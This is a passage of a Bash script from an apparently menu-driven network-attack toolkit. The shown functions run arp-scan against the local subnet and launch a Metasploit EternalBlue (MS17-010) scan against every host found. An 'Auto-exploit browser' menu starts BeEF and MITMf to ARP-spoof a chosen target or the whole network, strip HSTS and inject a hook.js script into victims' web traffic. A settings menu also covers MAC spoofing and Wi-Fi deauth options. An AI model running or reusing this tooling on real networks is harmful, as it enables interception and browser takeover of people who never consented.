ip\n\tLLL=$(local_ips $IPF)\n\t#getting zero ip\n\tZERO=$(give_ip_take_zero $LLL)\n\texport ZERO\n\techo -e \"\"$BS\"Scanning, please wait...\"$CE\"\"\n\ttempfile=\"/root/lscript/tempscan.txt\"\n\txterm -geometry 1x1+9999+999999 -e \"arp-scan -I \"$IPF\" \"$ZERO\"/24 | tee $tempfile\"\n\t#gnome-terminal -- arp-scan -I \"$IPF\" \"$ZERO\"/24 | tee $tempfile\n\tclear\n\t######\n\tT1=$(cat $tempfile | grep \"Ending arp-scan\")\n\tif [[ \"$T1\" = \"\" ]]\n\tthen\n\t\tlines=$(cat $tempfile | awk 'END{print NR}')\n\t\thosts=$((lines-3))\n\telse\n\t\tlines=$(cat $tempfile | awk 'END{print NR}')\n\t\thosts=$((lines-5))\n\tfi\n\thostsbackup=\"$hosts\"\n\t\tif [[ \"$hosts\" -le 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"No hosts found\"$CE\"\"\n\t\t\tsleep 1\n\t\telse\n\t\t\techo -e \"\"$BS\"Host(s) found:\"$CE\"\"\n\t\t\t##########\n\t\t\tn=1\n\t\t\tn2=2\n\t\t\twhile [[ \"$n\" -le \"$hosts\" ]]\n\t\t\tdo\n\t\t\t\t#Hosts start from line 3\n\t\t\t\tn1=$((n2+n))\n\t\t\t\thost[$n]=$(cat \"$tempfile\" | awk -v an1=\"$n1\" '{if(NR==an1 && $0 !~ /DUP:/){print $1}}')\n\t\t\t\tif [[ \"${host[$n]}\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\t#sometimes there are duplicate IPs.This should remove them.\n\t\t\t\t\tn2=$((n2+1))\n\t\t\t\t\thosts=$((hosts-1))\n\t\t\t\t\t#~ n=$((n+1))\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\t\tsize=${#host[$n]}\n\t\t\t\tsized=$((20-size))\n\t\t\t\tSPACESN=\" \"\n\t\t\t\tnumcalc=1\n\t\t\t\twhile [ $numcalc != $sized ]\n\t\t\t\tdo\n\t\t\t\t\tSPACESN=\"\"${SPACESN}\" \"\n\t\t\t\t\tnumcalc=$(( numcalc+1 ))\n\t\t\t\tdone\n\t\t\t\tmi[$n]=$(cat \"$tempfile\" | awk -v an1=\"$n1\" '{if(NR==an1){print $2}}')\n\t\t\t\tim[$n]=$(cat \"$tempfile\" | awk -v an1=\"$n1\" '{if(NR==an1){print $3}}')\n\t\t\t\tif [[ \"$MODE\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$YS\" $n\"$CE\") \"${host[$n]}\"${SPACESN}\"${mi[$n]}\"       \"${im[$n]}\"\"\n\t\t\t\telse\n\t\t\t\t\techo -e \"\"${host[$n]}\"${SPACESN}\"${mi[$n]}\"       \"${im[$n]}\"\"\n\t\t\t\tfi\n\t\t\t\tn=$((n+1))\n\t\t\tdone\n\t\t\tif [[ \"$MODE\" = 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$YS\" r\"$CE\") Rescan\"\n\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\techo -e \"Choose: \"\n\t\t\t\tread sch\n\t\t\t\tif [[ \"$sch\" = \"b\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo \"\"\n\t\t\t\telif [[ \"$sch\" = \"r\" ]]\n\t\t\t\tthen\n\t\t\t\t\tclear\n\t\t\t\t\tcontinue\n\t\t\t\telif [[ \"$sch\" -le \"$hosts\" && \"$sch\" -ge 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tOUTPUT=\"${host[$sch]}\"\n\t\t\t\t\texport OUTPUT\n\t\t\t\t\t#~ echo \"$OUTPUT\"\n\t\t\t\tfi\n\t\t\telse\n\t\t\t\techo -e \"\"$YS\" e\"$CE\") Check eternalblue exploit on IPs\"\n\t\t\t\techo -e \"\"$YS\" r\"$CE\") Rescan\"\n\t\t\t\techo -e \"Press \"$YS\"any other key\"$CE\" to go back\"\n\t\t\t\tread -n 1 ko\n\t\t\t\tif [[ \"$ko\" = \"r\" ]]\n\t\t\t\tthen\n\t\t\t\t\tclear\n\t\t\t\t\tcontinue\n\t\t\t\telif [[ \"$ko\" = \"e\" ]]\n\t\t\t\tthen\n\t\t\t\t\tn=1\n\t\t\t\t\ttotalhosts=\"\"\n\t\t\t\t\twhile [[ \"$n\" -le \"$hostsbackup\" ]]\n\t\t\t\t\tdo\n\t\t\t\t\t\ttotalhosts=\"\"$totalhosts\" \"${host[\"$n\"]}\"\"\n\t\t\t\t\t\tn=$((n+1))\n\t\t\t\t\tdone\n\t\t\t\t\tclear\n\t\t\t\t\tif [[ \"$totalhosts\" = \"\" || \"$totalhosts\" = \" \" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"No hosts found to check\"$CE\"\"\n\t\t\t\t\t\tsleep 2\n\t\t\t\t\t\tcontinue\n\t\t\t\t\tfi\n\t\t\t\t\techo -e \"\"$BS\"RHOSTS\"$CE\" <- \"$totalhosts\"\"\n\t\t\t\t\tsleep 2\n\t\t\t\t\tif [[ ! -d \"$LPATH\"/rce ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tmkdir\t\"$LPATH\"/rce\n\t\t\t\t\tfi\n\t\t\t\t\techo \"use auxiliary/scanner/smb/smb_ms17_010\" > \"$LPATH\"/rce/eternalbluerc.rc\n\t\t\t\t\techo \"set RHOSTS \"$totalhosts\"\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\t\t\t\t\techo \"exploit\" >> \"$LPATH\"/rce/eternalbluerc.rc\n\t\t\t\t\techo -e \"\"$BS\"Launching msfconsole. Please wait...\"$CE\"\"\n\t\t\t\t\tmsfconsole -r \"$LPATH\"/rce/eternalbluerc.rc\n\t\t\t\telse\n\t\t\t\t\tBACKL=1\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tfi\n\t\t\t##########\n\t\tfi\n\t\tbreak\n\t#~ fi\n\t######\ndone\n\n}\nfunction browser_exploiting\n{\n\tif [[ ! -f /usr/bin/arp-scan && ! -f /usr/sbin/arp-scan ]]\n\tthen\n\t\techo -e \"\"$BS\"Installing arp-scan\"$CE\"\"\n\t\tinstall_arp_scan\n\t\tclear\n\tfi\n\tTAR=\"\"\n\tSINT=\"\"\n\tbeefrunning=0\n\tclear\n\twhile true\n\tdo\n\t\tclear\n\t\tTERMINALTITLE=\"Auto-exploit browser\"\n\t\tdash_calc\n\t\tprintf '\\033]2;AUTO-EXPLOIT BROWSER\\a'\n\t\tif [[ \"$SINT\" = \"\" ]]\n\t\tthen\n\t\t\tWL=$(ifconfig | grep \"$WLANN:\")\n\t\t\tif [[ \"$WL\" != \"\" ]]\n\t\t\tthen\n\t\t\t\tSINT=\"$WLANN\"\n\t\t\t\tinter=0\n\t\t\telse\n\t\t\t\tEL=$(ifconfig | grep \"$ETH:\")\n\t\t\t\tif [[ \"$EL\" != \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tSINT=\"$ETH\"\n\t\t\t\t\tinter=0\n\t\t\t\telse\n\t\t\t\t\tSINT=\"\"$RS\"Not found\"$CE\"\"\n\t\t\t\t\tinter=1\n\t\t\t\tfi\n\t\t\tfi\n\t\t\t\n\t\tfi\n\t\tif [[ \"$TAR\" = \"\" ]]\n\t\tthen\n\t\t\tTAR=\"\"$RS\"Not set\"$CE\"\"\n\t\t\ttarer=1\n\t\tfi\n\t\techo -e \"\"$YS\" 1\"$CE\") Select interface                CURRENT:\"$YS\"\"$SINT\"\"$CE\"\"\n\t\techo -e \"\"$YS\" 2\"$CE\") Select target                   CURRENT:\"$YS\"\"$TAR\"\"$CE\"\"\n\t\techo -e \"\"$YS\" 3\"$CE\") Start BeEF\"\n\t\techo -e \"\"$YS\" 4\"$CE\") Open BeEF's ui panel in browser\"\n\t\techo -e \"\"$YS\" 5\"$CE\") Start MITMf\"\n\t\techo -e \"\"$YS\" 6\"$CE\") Fix errors\"\n\t\t#~ echo -e \"\"$YS\" 4\"$CE\") Close all windows\"\n\t\techo -e \"\"$YS\" i\"$CE\") Info\"\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\techo -e \"Choose: \"\n\t\tread AEB\n\t\tclear\n\t\tif [[ \"$AEB\" = \"b\" || \"$AEB\" = 00 ]]\n\t\tthen\n\t\t\tclear\n\t\t\tBACKL=1\n\t\t\tbreak\n\t\telif [[ \"$AEB\" = \"i\" ]]\n\t\tthen\n\t\t\tclear\n\t\t\techo -e \"\"$LGYS\"On this menu you can exploit and control browsers on your network.\"\n\t\t\techo -e \"Instructions: \"\n\t\t\techo -e \"BeEF:\"\n\t\t\techo -e \"\tFirst you need to specify an interface. Then start BeEF.\"\n\t\t\techo -e \"\tThen open the UI panel and log in with beef:beef .\"\n\t\t\techo -e \"\tThere you will see if any online browsers.\"\n\t\t\techo -e \"MITMf:\"\n\t\t\techo -e \"\tFirst you need to specify an interface and a target. Then start MITMf.\"\n\t\t\techo -e \"\tMITMf tries to inject the hook.js javascript to the target's website.\"$CE\"\"\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\telif [[ \"$AEB\" = 6 ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\tclear\n\t\t\tTERMINALTITLE=\"Fix errors\"\n\t\t\tdash_calc\n\t\t\tprintf '\\033]2;FIX ERRORS\\a'\n\t\t\techo -e \"\"$YS\" 1\"$CE\") MITMf error: Another process running on port 53\"\n\t\t\techo -e \"\"$YS\" 2\"$CE\") BeEF  error: Another process listening on port 3000\"\n\t\t\techo -e \"\"$YS\" 3\"$CE\") MITMf error: Could not resolve Gateway's MAC\"\n\t\t\techo -e \"\"$YS\" 4\"$CE\") MITMf error: [Errno 98] Address already in use\"\n\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\techo -e \"Choose: \"\n\t\t\tread AE\n\t\t\tclear\n\t\t\tif [[ \"$AE\" = 1 ]]\n\t\t\tthen\n\t\t\t\t#~ echo -e \"For this error, you need to type \"$YS\"netstat -lnpu | grep :53\"$CE\" to find the process that runs\n\t\t\t\t#~ on port 53 and kill it by \"$YS\"kill <PID>\"$CE\"\"\n\t\t\t\tPID1=$(lsof -t -i:53)\n\t\t\t\tif [[ \"$PID1\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$RS\"Could not find the process running on port 53\"$CE\"\"\n\t\t\t\telse\n\t\t\t\t\tkill $PID1 && echo -e \"\"$YS\"Fixed.\"$CE\"\"\n\t\t\t\tfi\n\t\t\t\techo -e \"\"\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telif [[ \"$AE\" = 2 ]]\n\t\t\tthen\n\t\t\t\techo -e \"You are facing this error because you did not press \"$YS\"ctrl c\"$CE\" on BeEF's window\n\t\t\t\tto close it.\"\n\t\t\t\techo -e \"\"\n\t\t\t\tPID1=$(lsof -t -i:3000)\n\t\t\t\tif [[ \"$PID1\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$RS\"Could not find the process running on port 3000\"$CE\"\"\n\t\t\t\telse\n\t\t\t\t\tkill $PID1 && echo -e \"\"$YS\"Fixed.\"$CE\"\"\n\t\t\t\tfi\n\t\t\t\techo -e \"\"\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telif [[ \"$AE\" = 3 ]]\n\t\t\tthen\n\t\t\t\techo -e \"The only fix on this is to retry mitmf option until it starts correctly.\"\n\t\t\t\techo -e \"\"\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telif [[ \"$AE\" = 4 ]]\n\t\t\tthen\n\t\t\t\tHT=$(lsof -t -i:80)\n\t\t\t\tif [[ \"$HT\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$RS\"Could not find the issue\"$CE\"\"\n\t\t\t\telse\n\t\t\t\t\tkill $HT && echo -e \"\"$YS\"Fixed\"$CE\"\"\n\t\t\t\tfi\n\t\t\t\techo -e \"\"\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telif [[ \"$AE\" = \"b\" ]]\n\t\t\tthen\n\t\t\t\tclear\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\tdone\n\t\telif [[ \"$AEB\" = 4 ]]\n\t\tthen\n\t\t\t#make sure BeEF is running.\n\t\t\tif [[ \"$beefrunning\" = 0 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"BeEF is not running\"$CE\"\"\n\t\t\t\tsleep 3\n\t\t\telse\n\t\t\t\tclear\n\t\t\t\texport SINT\n\t\t\t\tLOC=$(local_ips $SINT)\n\t\t\t\texport LOC\n\t\t\t\tCONF=$(is_it_an_ip $LOC)\n\t\t\t\tif [[ \"$CONF\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tgio open http://\"$LOC\":3000/ui/panel\n\t\t\t\telse\n\t\t\t\t\techo -e \"\"$RS\"Could not find your local IP\"$CE\"\"\n\t\t\t\t\tsleep 3\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$AEB\" = 2 ]]\n\t\tthen\n\t\t\tif [[ \"$inter\" != 1 ]]\n\t\t\tthen\n\t\t\t\tclear\n\t\t\t\twhile true\n\t\t\t\tdo\n\t\t\t\t\tclear\n\t\t\t\t\tTERMINALTITLE=\"Select target\"\n\t\t\t\t\tdash_calc\n\t\t\t\t\tprintf '\\033]2;SELECT TARGET\\a'\n\t\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Scan and choose\"\n\t\t\t\t\techo -e \"\"$YS\" 2\"$CE\") Type target's IP\"\n\t\t\t\t\t\techo -e \"\"$YS\" 3\"$CE\") Target the whole network\"\n\t\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\t\techo -e \"Choose: \"\n\t\t\t\t\tread TARR\n\t\t\t\t\tclear\n\t\t\t\t\tif [[ \"$TARR\" = \"b\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tbreak\n\t\t\t\t\telif [[ \"$TARR\" = 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tip_scan $SINT 1\n\t\t\t\t\t\tTARGETI=\"$OUTPUT\"\n\t\t\t\t\t\tsize=${#TARGETI}\n\t\t\t\t\t\tif [[ \"$size\" -le 16 && \"$size\" -ge 7 ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\tTAR=\"$TARGETI\"\n\t\t\t\t\t\t\ttarer=0\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\ttarer=1\n\t\t\t\t\t\tfi\n\t\t\t\t\t\twholenetwork=0\n\t\t\t\t\t\tbreak\n\t\t\t\t\telif [[ \"$TARR\" = 2 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"Target: \"\n\t\t\t\t\t\tread TARGETI\n\t\t\t\t\t\tsize=${#TARGETI}\n\t\t\t\t\t\tif [[ \"$size\" -le 16 && \"$size\" -ge 7 ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\tTAR=\"$TARGETI\"\n\t\t\t\t\t\t\ttarer=0\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\techo -e \"\"$RS\"Invalid IP\"$CE\"\"\n\t\t\t\t\t\t\ttarer=1\n\t\t\t\t\t\t\tsleep 2\n\t\t\t\t\t\tfi\n\t\t\t\t\t\twholenetwork=0\n\t\t\t\t\t\tbreak\n\t\t\t\t\telif [[ \"$TARR\" = 3 ]]\n\t\t\t\t\tthen\t\n\t\t\t\t\t\tTAR=\"EVERYONE\"\n\t\t\t\t\t\ttarer=0\n\t\t\t\t\t\twholenetwork=1\n\t\t\t\t\t\tbreak\n\t\t\t\t\tfi\n\t\t\t\tdone\n\t\t\telse\n\t\t\t\techo -e \"\"$RS\"Select interface first\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\tfi\n\t\telif [[ \"$AEB\" = 5 ]]\n\t\tthen\n\t\t\tif [[ \"$inter\" = 0 && \"$tarer\" = 0 ]]\n\t\t\tthen\n\t\t\t\tif [[ -d /root/MITMf ]]\n\t\t\t\tthen\n\t\t\t\t\t\tmitmfint=\"$SINT\"\n\t\t\t\t\t\texport mitmfint\n\t\t\t\t\t\tclear\n\t\t\t\t\t\tmitmfgate=$(route -n | grep \"$mitmfint\" | awk '{if($2!=\"0.0.0.0\"){print $2}}')\n\t\t\t\t\t\tisit=$(is_it_an_ip \"$mitmfgate\")\n\t\t\t\t\t\tif [[ \"$mitmfgate\" != \"\" && \"$isit\" = 1 ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\texport mitmfgate\n\t\t\t\t\t\t\tclear\n\t\t\t\t\t\t\tTEST=$(ifconfig | grep $mitmfint)\n\t\t\t\t\t\t\tif [[ $TEST != \"\" ]]\n\t\t\t\t\t\t\tthen\n\t\t\t\t\t\t\t\tiffile=\"\"$LPATH\"/iftemp.txt\"\n\t\t\t\t\t\t\t\tifconfig $mitmfint > $iffile\n\t\t\t\t\t\t\t\tmitmflocalip=$(cat $iffile | grep \" inet \" | awk -F \"inet \" {'print $2'} | cut -d ' ' -f1)\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\techo -e \"\"$RS\"ERROR 5. Could not find your local IP. Make sure you are connected to a network on interface \"$SINT\"\"$CE\"\"\n\t\t\t\t\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t\t\t\t\t$READAK\n\t\t\t\t\t\t\t\tcontinue\n\t\t\t\t\t\t\tfi\n\t\t\t\t\t\t\tclear\n\t\t\t\t\t\t\techo -e \"hook.js URL path(\"$YS\"Enter\"$CE\"=http://\"$mitmflocalip\":3000/hook.js): \"\n\t\t\t\t\t\t\tread hookch\n\t\t\t\t\t\t\tif [[ \"$hookch\" = \"\" ]]\n\t\t\t\t\t\t\tthen\n\t\t\t\t\t\t\t\tmitmfhook=\"http://\"$mitmflocalip\":3000/hook.js\"\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tmitmfhook=\"$hookch\"\n\t\t\t\t\t\t\tfi\n\t\t\t\t\t\t\texport mitmfhook\n\t\t\t\t\t\t\tcd /root/MITMf\n\t\t\t\t\t\t\tclear\n\t\t\t\t\t\t\tif [[ \"$wholenetwork\" == 0 ]]\n\t\t\t\t\t\t\tthen\n\t\t\t\t\t\t\t\txterm -hold -T \"MITMf\" -geometry 80x15+9999+9999 -e \"python mitmf.py -i \"$mitmfint\" --spoof --arp --gateway \"$mitmfgate\" --target \"$TAR\" --hsts --inject --js-url \"$mitmfhook\" && echo -e '' && echo -e 'Close this window manually'\"  & disown\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\txterm -hold -T \"MITMf\" -geometry 80x15+9999+9999 -e \"python mitmf.py -i \"$mitmfint\" --spoof --arp --gateway \"$mitmfgate\" --hsts --inject --js-url \"$mitmfhook\" && echo -e '' && echo -e 'Close this window manually'\"  & disown\n\t\t\t\t\t\t\tfi\n\t\t\t\t\t\t\tcd\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\techo -e \"\"$RS\"ERROR 4. Could not find gateway. Make sure you are connected to a network on interface \"$SINT\"\"$CE\"\"\n\t\t\t\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t\t\t\t$READAK\n\t\t\t\t\t\tfi\n\t\t\t\telse\n\t\t\t\t\techo -e \"\"$RS\"Mitmf is not installed.Type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"\n\t\t\t\t\tread INSTALL\n\t\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tinstall_mitmf\n\t\t\t\t\tfi\n\t\t\t\tfi\n\t\t\t\tcd\n\t\t\telse\n\t\t\t\tif [[ \"$inter\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$RS\"No interface selected\"$CE\"\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$tarer\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$RS\"No target selected\"$CE\"\"\n\t\t\t\t\tsleep 1\n\t\t\t\tfi\n\t\t\t\tsleep 2\n\t\t\tfi\n\t\telif [[ \"$AEB\" = 3 ]]\n\t\tthen\n\t\t\tif [[ \"$inter\" = 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"No interface selected\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\tfi\n\t\t\tcd /usr/share/beef-xss \n\t\t\tbeefrunning=1\n\t\t\txterm -T \"BEEF\" -hold -geometry 80x15+9999+0 -e \"./beef && echo -e '' && beefrunning=0 && export beefrunning && echo -e 'Close this window manually'\" & disown\n\t\t\tcd\n\t\telif [[ \"$AEB\" = 0 ]]\n\t\tthen\n\t\t\tclear\n\t\t\texit\n\t\telif [[ \"$AEB\" = 1 ]]\n\t\tthen\n\t\t\tselect_interface\n\t\t\t\n\t\t#if inter=1 then error\n\t\tfi\n\tdone\n}\nfunction settings_menu\n{\n\tif [[ ! -d \"$LPATH\"/settings ]]\n\tthen\n\t\tmkdir \"$LPATH\"/settings \n\tfi\n\tclear\n\twhile true\n\tdo\n\t\tclear\n\t\tTERMINALTITLE=\"SETTINGS\"\n\t\tdash_calc\n\t\tprintf '\\033]2;SETTINGS\\a'\n\t\tif [[ -f \"$LPATH\"/settings/AWUS036ACH.txt ]]\n\t\tthen\n\t\t\tread ALFA < \"$LPATH\"/settings/AWUS036ACH.txt\n\t\telse\n\t\t\tALFA=\"no\"\n\t\tfi\n\t\tif [[ -f \"$LPATH\"/settings/startmac.txt ]]\n\t\tthen\n\t\t\tread STARTMAC < \"$LPATH\"/settings/startmac.txt\n\t\telse\n\t\t\tSTARTMAC=\"00:11:22:33:44:55\"\n\t\tfi\n\t\tif [[ -f \"$LPATH\"/settings/ignorenegativeone.txt ]]\n\t\tthen\n\t\t\tread IGN < \"$LPATH\"/settings/ignorenegativeone.txt\n\t\telse\n\t\t\tIGN=\"no\"\n\t\tfi\n\t\tif [[ -f \"$LPATH\"/settings/arpin.txt ]]\n\t\tthen\n\t\t\tread ARPIN < \"$LPATH\"/settings/arpin.txt\n\t\telse\n\t\t\tARPIN=\"$WLANN\"\n\t\tfi\n\t\techo -e \"\"$YS\" 1\"$CE\") Change logo color\"\n\t\techo -e \"\"$YS\" 2\"$CE\") Howdoi settings\"\n\t\techo -e \"\"$YS\" 3\"$CE\") ALFA AWUS036ACH support                      $ALFA\"\n\t\techo -e \"\"$YS\" 4\"$CE\") Ignore negative one when deauthing           $IGN\"\n\t\techo -e \"\"$YS\" 5\"$CE\") MAC to change to,when starting monitor       $STARTMAC\"\t\n\t\techo -e \"\"$YS\" 6\"$CE\") Interface for arp-scan                       $ARPIN\"\n\t\techo -e \"\"$YS\" 7\"$CE\") Interface for iftop(show bandwidth)          $iftopint\"\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\techo -e \"\"$YS\" 0\"$CE\") Exit\"\n\t\techo -e \"Choose: \"\n\t\tread SET\n\t\tclear\n\t\tif [[ \"$SET\" = \"back\" || \"$SET\" = \"b\" || \"$SET\" = \"00\" ]]\n\t\tthen\n\t\t\tBACKL=1\n\t\t\tbreak\n\t\telif [[ \"$SET\" = 0 ]]\n\t\tthen\n\t\t\texit\n\t\telif [[ \"$SET\" = 7 ]]\n\t\tthen\n\t\t\tclear\n\t\t\techo -e \"\"$BS\"Interface to be used for iftop: \"$CE\"\"\n\t\t\tread IFTOP\n\t\t\tIFTOPTEST=$(ifconfig | grep \"$IFTOP\")\n\t\t\tif [[ \"$IFTOPTEST\" = \"\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"\"$IFTOP\" is not currently available.\"$CE\"\"\n\t\t\t\techo -e \"Do you still want to use $IFTOP for iftop?\"$YNYES\"\"\n\t\t\t\tread STARP\n\t\t\t\tif [[ \"$STARP\" = \"n\" ]]\n\t\t\t\tthen\n\t\t\t\t\tIFTOP=\"\"\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\t\techo -e \"$IFTOP\" > \"$LPATH\"/settings/iftopint.txt\n\t\telif [[ \"$SET\" = 6 ]]\n\t\tthen\n\t\t\tclear\n\t\t\techo -e \"\"$BS\"Interface to be used for arp-scan: \"$CE\"\"\n\t\t\tread ARPIN\n\t\t\tARPINTEST=$(ifconfig | grep \"$ARPIN\")\n\t\t\tif [[ \"$ARPINTEST\" = \"\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"\"$ARPIN\" is not currently available.\"$CE\"\"\n\t\t\t\techo -e \"Do you still want to use $ARPIN for arp-scan?\"$YNYES\"\"\n\t\t\t\tread STARP\n\t\t\t\tif [[ \"$STARP\" = \"n\" ]]\n\t\t\t\tthen\n\t\t\t\t\tARPIN=\"\"\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\t\techo -e \"$ARPIN\" > \"$LPATH\"/settings/arpin.txt\n\t\telif [[ \"$SET\" = 5 ]]\n\t\tthen\n\t\t\tclear\n\t\t\techo -e \"Type new MAC(\"$YS\"Enter\"$CE\"=\"$DEFMAC\"): \"\n\t\t\tread NEWMAC\n\t\t\tif [[ \"$NEWMAC\" = \"\" ]]\n\t\t\tthen\n\t\t\t\techo \"$DEFMAC\" > \"$LPATH\"/settings/startmac.txt\n\t\t\telse\n\t\t\t\tsizemac=${#NEWMAC}\n\t\t\t\tif [[ \"$sizemac\" != 17 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$RS\"Invalid MAC. Setting it back to default\"$CE\"\"\n\t\t\t\t\tsleep 4\n\t\t\t\telse\n\t\t\t\t\techo $NEWMAC > \"$LPATH\"/settings/startmac.txt\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$SET\" = 4 ]]\n\t\tthen\n\t\t\tif [[ \"$IGN\" = \"yes\" ]]\n\t\t\tthen\n\t\t\t\tIGN=\"no\"\n\t\t\telse\n\t\t\t\tIGN=\"yes\"\n\t\t\tfi\n\t\t\techo -e \"$IGN\" > \"$LPATH\"/settings/ignorenegativeone.txt\n\t\telif [[ \"$SET\" = 3 ]]\n\t\tthen\n\t\t\tif [[ \"$ALFA\" = \"yes\" ]]\n\t\t\tthen\n\t\t\t\tALFA=\"no\"\n\t\t\telse\n\t\t\t\tALFA=\"yes\"\n\t\t\tfi\n\t\t\techo -e \"$ALFA\" > \"$LPATH\"/settings/AWUS036ACH.txt\n\t\telif [[ \"$SET\" = 2 ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\tclear\n\t\t\t\tif [[ -f \"$LPATH\"/settings/dispfull.txt ]]\n\t\t\t\tthen\n\t\t\t\t\tread dispfull < \"$LPATH\"/settings/dispfull.txt\n\t\t\t\telse\n\t\t\t\t\tdispfull=\"false\"\n\t\t\t\tfi\n\t\t\t\tif [[ -f \"$LPATH\"/settings/colorout.txt ]]\n\t\t\t\tthen\n\t\t\t\t\tread colorout < \"$LPATH\"/settings/colorout.txt\n\t\t\t\telse\n\t\t\t\t\tcolorout=\"false\"\n\t\t\t\tfi\n\t\t\t\tif [[ -f \"$LPATH\"/settings/onlylink.txt ]]\n\t\t\t\tthen\n\t\t\t\t\tread onlylink < \"$LPATH\"/settings/onlylink.txt\n\t\t\t\telse\n\t\t\t\t\tonlylink=\"false\"\n\t\t\t\tfi\n\t\t\t\tif [[ -f \"$LPATH\"/settings/numofans.txt ]]\n\t\t\t\tthen\n\t\t\t\t\tread numofans < \"$LPATH\"/settings/numofans.txt\n\t\t\t\telse\n\t\t\t\t\tnumofans=\"1\"\n\t\t\t\tfi\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Display the full answer text              \"$dispfull\"\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") Colorized output                          \"$colorout\"\"\n\t\t\t\techo -e \"\"$YS\" 3\"$CE\") Display only the answer link              \"$onlylink\"\"\n\t\t\t\techo -e \"\"$YS\" 4\"$CE\") Number of answers to return               \"$numofans\"\"\n\t\t\t\techo -e \"\"$YS\" 5\"$CE\") Clear the cache\"\n\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\techo -e \"Choose: \"\n\t\t\t\tread HOWCH\n\t\t\t\tif [[ \"$HOWCH\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$dispfull\" = \"false\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tdispfull=\"true\"\n\t\t\t\t\telse\n\t\t\t\t\t\tdispfull=\"false\"\n\t\t\t\t\tfi\n\t\t\t\t\techo \"$dispfull\" > \"$LPATH\"/settings/dispfull.txt\n\t\t\t\telif [[ \"$HOWCH\" = 2 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$colorout\" = \"false\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tcolorout=\"true\"\n\t\t\t\t\telse\n\t\t\t\t\t\tcolorout=\"false\"\n\t\t\t\t\tfi\n\t\t\t\t\techo \"$colorout\" > \"$LPATH\"/settings/colorout.txt\n\t\t\t\telif [[ \"$HOWCH\" = 3 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$onlylink\" = \"false\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tonlylink=\"true\"\n\t\t\t\t\telse\n\t\t\t\t\t\tonlylink=\"false\"\n\t\t\t\t\tfi\n\t\t\t\t\techo \"$onlylink\" > \"$LPATH\"/settings/onlylink.txt\n\t\t\t\telif [[ \"$HOWCH\" = 4 ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Type number of answers to 